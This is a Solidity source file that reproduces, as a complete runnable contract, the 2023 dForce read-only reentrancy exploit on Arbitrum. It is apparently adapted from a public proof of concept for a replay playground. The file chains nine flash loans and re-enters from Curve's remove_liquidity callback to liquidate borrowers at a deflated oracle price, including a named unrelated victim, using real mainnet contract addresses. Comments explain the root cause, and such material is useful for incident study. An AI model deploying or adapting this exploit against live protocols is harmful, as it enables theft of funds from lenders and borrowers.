// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-dForce).
// The original DeFiHackLabs PoC runs the ENTIRE attack inline in the Foundry test
// contract (`ContractTest is Test`) — every flash-loan callback (receiveFlashLoan,
// executeOperation x2, uniswapV3FlashCallback, uniswapV2Call, ZyberCall) and the
// reentrant fallback() live on the test itself, and `address(this)` is the attacker.
// There is no standalone exploit contract to deploy. This is a faithful,
// self-contained copy of that inline attack (logic + constants copied verbatim from
// test/dForce_exp.sol) so the playground can deploy it and record run().
//
// Root cause (read-only reentrancy): dForce's PriceOracleV2 prices the
// VWSTETHCRVGAUGE collateral by calling out to Curve's wstETHCRV pool
// get_virtual_price(). That Curve pool (Vyper 0.3.1) sends the underlying ETH to
// the caller INSIDE remove_liquidity() before it re-syncs its own virtual_price
// storage. The attacker re-enters from that ETH transfer's callback and calls
// dForceContract.liquidateBorrow() while Curve's virtual_price is still deflated
// (~0.2038 instead of ~1.0), so the liquidation seizes ~5x more VWSTETHCRVGAUGE
// collateral than it should for the same repaid USX debt.
//
// Descoping note: NONE. Unlike some other multi-stage hacks in this registry, the
// entire dForce attack executes as a single Foundry `testExploit()` call at a
// single block/timestamp — there is no vm.warp / second-transaction requirement.
// The 9-deep flash-loan stack (Balancer -> Aave V3 -> Radiant -> UniV3 -> SLP1 ->
// SLP2 -> SLP3 -> Zyber -> Saddle/SwapFlashLoan) and the reentrant liquidation are
// all reproduced verbatim, so this is the FULL attack, not a subset.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWETH is IERC20 {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IUniswapV3Flash {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

interface ISwapFlashLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts)
        external
        returns (uint256[2] memory);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IVWSTETHCRVGAUGE is IERC20 {
    function redeem(address receiver, uint256 amount) external;
}

interface IWSTETHCRVGAUGE is IERC20 {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface IDForce {
    function borrowBalanceStored(address account) external returns (uint256);
    function liquidateBorrow(address _borrower, uint256 _repayAmount, address _assetCollateral) external;
}

interface IPriceOracleV2 {
    function getUnderlyingPrice(address _asset) external returns (uint256);
}

interface ICointroller {
    function closeFactorMantissa() external view returns (uint256);
    function liquidateCalculateSeizeTokens(address dToken, address dTokenCollateral, uint256 actualRepayAmount)
        external
        view
        returns (uint256);
}

interface IcurveYSwap {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IGMXVault {
    function swap(address _tokenIn, address _tokenOut, address _receiver) external;
}

/// @notice Helper "victim/self" borrower — deposits wstETHCRV-gauge as collateral and
/// borrows USX from dForce, exactly mirroring the original PoC's `Borrower` contract.
contract Borrower {
    IERC20 constant WSTETHCRV = IERC20(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);
    IWSTETHCRVGAUGE constant WSTETHCRVGAUGE = IWSTETHCRVGAUGE(0x098EF55011B6B8c99845128114A9D9159777d697);
    IERC20 constant USX = IERC20(0x641441c631e2F909700d2f41FD87F0aA6A6b4EDb);
    IDForce constant dForceContract = IDForce(0xC462fF1063172BAC6f6823A17ED181a0586f0FC8);

    function exec() external {
        WSTETHCRV.approve(address(WSTETHCRVGAUGE), type(uint256).max);
        uint256 depositAmount = 1_904_761_904_761_904_761_904;
        WSTETHCRVGAUGE.deposit(depositAmount);
        WSTETHCRVGAUGE.approve(address(dForceContract), type(uint256).max);
        uint256 wstETHCRVGaugeAmount = WSTETHCRVGAUGE.balanceOf(address(this));
        uint256 borrowAmount = 2_080_000_000_000_000_000_000_000;
        // selector 0x4381c41a == mintAndBorrow(uint256,uint256,uint256) on dForce's
        // iToken (mint collateral tokenIndex=1, then borrow `borrowAmount` USX).
        (bool success,) = address(dForceContract).call(
            abi.encodeWithSelector(0x4381c41a, uint256(1), wstETHCRVGaugeAmount, borrowAmount)
        );
        require(success, "Borrower: mintAndBorrow failed");
        USX.transfer(msg.sender, USX.balanceOf(address(this)));
    }
}

contract DForceReadOnlyReentrancy {
    IWETH constant WETH = IWETH(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 constant USX = IERC20(0x641441c631e2F909700d2f41FD87F0aA6A6b4EDb);
    IERC20 constant WSTETH = IERC20(0x5979D7b546E38E414F7E9822514be443A4800529);
    IERC20 constant WSTETHCRV = IERC20(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);
    IERC20 constant WSTETHCRVGAUGE_TOKEN = IERC20(0x098EF55011B6B8c99845128114A9D9159777d697);
    IWSTETHCRVGAUGE constant WSTETHCRVGAUGE = IWSTETHCRVGAUGE(0x098EF55011B6B8c99845128114A9D9159777d697);
    IVWSTETHCRVGAUGE constant VWSTETHCRVGAUGE = IVWSTETHCRVGAUGE(0x2cE498b79C499c6BB64934042eBA487bD31F75ea);
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan constant aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveFlashloan constant Radiant = IAaveFlashloan(0x2032b9A8e9F7e76768CA9271003d3e43E1616B1F);
    IUniswapV3Flash constant UniV3Flash = IUniswapV3Flash(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    IUniPairV2 constant SLP1 = IUniPairV2(0xB7E50106A5bd3Cf21AF210A755F9C8740890A8c9);
    IUniPairV2 constant SLP2 = IUniPairV2(0x905dfCD5649217c42684f23958568e533C711Aa3);
    IUniPairV2 constant SLP3 = IUniPairV2(0x0C1Cf6883efA1B496B01f654E247B9b419873054);
    IUniPairV2 constant ZLP = IUniPairV2(0x8b8149Dd385955DC1cE77a4bE7700CCD6a212e65);
    ISwapFlashLoan constant swapFlashLoan = ISwapFlashLoan(0xa067668661C84476aFcDc6fA5D758C4c01C34352);
    ICurvePool constant curvePool = ICurvePool(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80);
    ICointroller constant cointroller = ICointroller(0x61afB763bc265bD372e8Af8daC00196C9A5eCea0);
    address constant aArbWETH = 0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8;
    address constant rWETH = 0x15b53d277Af860f51c3E6843F8075007026BBb3a;
    IDForce constant dForceContract = IDForce(0xC462fF1063172BAC6f6823A17ED181a0586f0FC8);
    IPriceOracleV2 constant PriceOracle = IPriceOracleV2(0x15962427A9795005c640A6BF7f99c2BA1531aD6d);
    IcurveYSwap constant curveYSwap = IcurveYSwap(0x2ce5Fd6f6F4a159987eac99FF5158B7B62189Acf);
    IGMXVault constant GMXVault = IGMXVault(0x489ee077994B6658eAfA855C308275EAd8097C4A);
    address constant victimAddress2 = 0x916792f7734089470de27297903BED8a4630b26D;

    Borrower borrower;
    uint256 balancerFlashloanAmount;
    uint256 aaveV3FlashloanAmount;
    uint256 UniV3FlashloanAmount;
    uint256 SLP1FlashloanAmount;
    uint256 SLP2FlashloanAmount;
    uint256 SLP3FlashloanAmount;
    uint256 ZLPFlashloanAmount;
    uint256 swapFlashloanAmount;
    uint256 nonce;

    // step 0: entry point — mirrors testExploit() minus the final GMX->WETH swap
    // bookkeeping, which is unchanged here too.
    function run() external {
        borrower = new Borrower();
        WSTETH.approve(address(curvePool), type(uint256).max);
        WSTETHCRV.approve(address(curvePool), type(uint256).max);
        balancerFlashloan();
        USX.approve(address(curveYSwap), type(uint256).max);
        curveYSwap.exchange_underlying(0, 1, 500_000 * 1e18, 0);
        USDC.transfer(address(GMXVault), USDC.balanceOf(address(this)));
        GMXVault.swap(address(USDC), address(WETH), address(this));
    }

    // 1. balancerFlashloan
    function balancerFlashloan() internal {
        balancerFlashloanAmount = WETH.balanceOf(address(balancer));
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = balancerFlashloanAmount;
        bytes memory userData = "";
        balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    // 2. balancer flash loan callback
    function receiveFlashLoan(
        address[] memory, /* tokens */
        uint256[] memory, /* amounts */
        uint256[] memory, /* feeAmounts */
        bytes memory /* userData */
    ) external {
        aaveV3Flashloan();
        WETH.transfer(address(balancer), balancerFlashloanAmount);
    }

    // 3. aaveV3Flashloan
    function aaveV3Flashloan() internal {
        aaveV3FlashloanAmount = WETH.balanceOf(aArbWETH);
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveV3FlashloanAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    // 4. aaveV3Flashloan callback  6. RadiantFlashloan callback
    function executeOperation(
        address[] calldata, /* assets */
        uint256[] calldata, /* amounts */
        uint256[] calldata, /* premiums */
        address, /* initiator */
        bytes calldata /* params */
    ) external returns (bool) {
        if (msg.sender == address(aaveV3)) {
            RadiantFlashloan();
            WETH.approve(address(aaveV3), type(uint256).max);
            return true;
        } else if (msg.sender == address(Radiant)) {
            UniSwapV3Flashloan();
            WETH.approve(address(Radiant), type(uint256).max);
            return true;
        }
        return false;
    }

    // 5. RadiantFlashloan
    function RadiantFlashloan() internal {
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = WETH.balanceOf(rWETH);
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(1), 0);
    }

    // 7. UniSwapV3Flashloan
    function UniSwapV3Flashloan() internal {
        UniV3FlashloanAmount = WETH.balanceOf(address(UniV3Flash));
        UniV3Flash.flash(address(this), UniV3FlashloanAmount, 0, new bytes(1));
    }

    // 8. uniswapV3Flash callback
    function uniswapV3FlashCallback(uint256, /* amount0 */ uint256, /* amount1 */ bytes calldata /* data */ )
        external
    {
        SLP1Flashloan();
        WETH.transfer(address(UniV3Flash), UniV3FlashloanAmount * 1000 / 997 + 1000);
    }

    // 9. sushipair1Flashloan
    function SLP1Flashloan() internal {
        SLP1FlashloanAmount = WETH.balanceOf(address(SLP1)) - 1;
        SLP1.swap(0, SLP1FlashloanAmount, address(this), new bytes(1));
    }

    // 11. sushipair2Flashloan
    function SLP2Flashloan() internal {
        SLP2FlashloanAmount = WETH.balanceOf(address(SLP2)) - 1;
        SLP2.swap(SLP2FlashloanAmount, 0, address(this), new bytes(1));
    }

    // 13. sushipair3Flashloan
    function SLP3Flashloan() internal {
        SLP3FlashloanAmount = WETH.balanceOf(address(SLP3)) - 1;
        SLP3.swap(0, SLP3FlashloanAmount, address(this), new bytes(1));
    }

    // 10/12/14. sushi pair flash-swap callbacks (shared uniswapV2Call entrypoint)
    function uniswapV2Call(address, /* sender */ uint256, /* amount0 */ uint256, /* amount1 */ bytes calldata /* data */ )
        external
    {
        if (msg.sender == address(SLP1)) {
            SLP2Flashloan();
            WETH.transfer(address(SLP1), SLP1FlashloanAmount * 1000 / 997 + 1000);
        } else if (msg.sender == address(SLP2)) {
            SLP3Flashloan();
            WETH.transfer(address(SLP2), SLP2FlashloanAmount * 1000 / 997 + 1000);
        } else if (msg.sender == address(SLP3)) {
            ZyberFlashloan();
            WETH.transfer(address(SLP3), SLP3FlashloanAmount * 1000 / 997 + 1000);
        }
    }

    // 15. ZyberFlashloan
    function ZyberFlashloan() internal {
        ZLPFlashloanAmount = WETH.balanceOf(address(ZLP)) - 1;
        ZLP.swap(ZLPFlashloanAmount, 0, address(this), new bytes(1));
    }

    // 16. ZyberFlashloan callback
    function ZyberCall(address, /* sender */ uint256, /* amount0 */ uint256, /* amount1 */ bytes calldata /* data */ )
        external
    {
        SwapFlashLoans();
        WETH.transfer(address(ZLP), ZLPFlashloanAmount * 10_000 / 9975 + 1000);
    }

    // 17. SwapFlashLoan (Saddle-style)
    function SwapFlashLoans() internal {
        swapFlashloanAmount = WETH.balanceOf(address(swapFlashLoan));
        swapFlashLoan.flashLoan(address(this), address(WETH), swapFlashloanAmount, new bytes(1));
    }

    // 18. SwapFlashLoan callback — THE CORE ATTACK: builds the Curve LP position,
    // opens the dForce borrow, then triggers the read-only-reentrant remove_liquidity.
    function executeOperation(address, /* pool */ address, /* token */ uint256 amount, uint256 fee, bytes calldata /* params */ )
        external
        payable
    {
        uint256 ETHBalance = WETH.balanceOf(address(this));
        WETH.withdraw(ETHBalance);
        curvePool.add_liquidity{value: ETHBalance}([ETHBalance, 0], 0);
        USX.approve(address(dForceContract), type(uint256).max);
        USX.approve(address(VWSTETHCRVGAUGE), type(uint256).max);

        // Seed the helper Borrower with wstETHCRV, which deposits into the gauge and
        // opens a dForce USX borrow against the vaulted gauge collateral.
        WSTETHCRV.transfer(address(borrower), 1_904_761_904_761_904_761_904);
        borrower.exec();

        // THE VULNERABLE CALL: Curve's Vyper 0.3.1 remove_liquidity() sends the
        // underlying ETH to msg.sender (this contract) BEFORE re-syncing its own
        // virtual_price storage — firing fallback() below while Curve's internal
        // state (and therefore dForce's oracle price) is still mid-update.
        uint256 burnAmount = 63_438_591_176_197_540_597_712;
        curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]); // curve read-only-reentrancy

        burnAmount = 2_924_339_222_027_299_635_899;
        curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]);
        curvePool.exchange(1, 0, WSTETH.balanceOf(address(this)), 0);
        WETH.deposit{value: address(this).balance}();
        WETH.transfer(address(swapFlashLoan), amount + fee); // repay flashloan amount
    }

    // Reentrant entry point — fires when Curve's remove_liquidity() sends ETH back
    // to this contract mid-call, before Curve finishes updating virtual_price.
    fallback() external payable {
        if (nonce == 0 && msg.sender == address(curvePool)) {
            nonce++;

            // Reads PriceOracleV2.getUnderlyingPrice(VWSTETHCRVGAUGE), which walks
            // down to curvePool.get_virtual_price() — deflated right now because
            // Curve hasn't finished remove_liquidity() yet.
            uint256 borrowAmount = dForceContract.borrowBalanceStored(address(borrower));
            uint256 Multiplier = cointroller.closeFactorMantissa();
            cointroller.liquidateCalculateSeizeTokens(
                address(dForceContract), address(VWSTETHCRVGAUGE), borrowAmount * Multiplier / 1e18
            );
            // liquidateBorrow() re-reads the SAME deflated oracle price internally,
            // so it seizes ~5x more VWSTETHCRVGAUGE than the repaid USX should buy.
            dForceContract.liquidateBorrow(address(borrower), 560_525_526_525_080_924_601_515, address(VWSTETHCRVGAUGE));

            borrowAmount = dForceContract.borrowBalanceStored(victimAddress2);
            cointroller.liquidateCalculateSeizeTokens(
                address(dForceContract), address(VWSTETHCRVGAUGE), borrowAmount * Multiplier / 1e18
            );
            // Same broken price is used to liquidate a REAL, unrelated victim borrower.
            dForceContract.liquidateBorrow(victimAddress2, 300_037_034_111_437_845_493_368, address(VWSTETHCRVGAUGE));

            VWSTETHCRVGAUGE.redeem(address(this), VWSTETHCRVGAUGE.balanceOf(address(this)));
            WSTETHCRVGAUGE.withdraw(WSTETHCRVGAUGE_TOKEN.balanceOf(address(this)));
        }
    }

    // NOTE: deliberately NO receive() function — matching the original PoC's
    // `ContractTest`, which defines only `fallback() external payable`. Curve's
    // remove_liquidity() sends plain ETH with EMPTY calldata, and when a contract
    // has no receive(), Solidity's dispatcher routes an empty-calldata call to
    // fallback() instead. Adding a receive() here would silently steal that call
    // (an empty receive() executes instead of the reentrant fallback logic above),
    // breaking the entire read-only-reentrancy mechanism this PoC demonstrates.
}
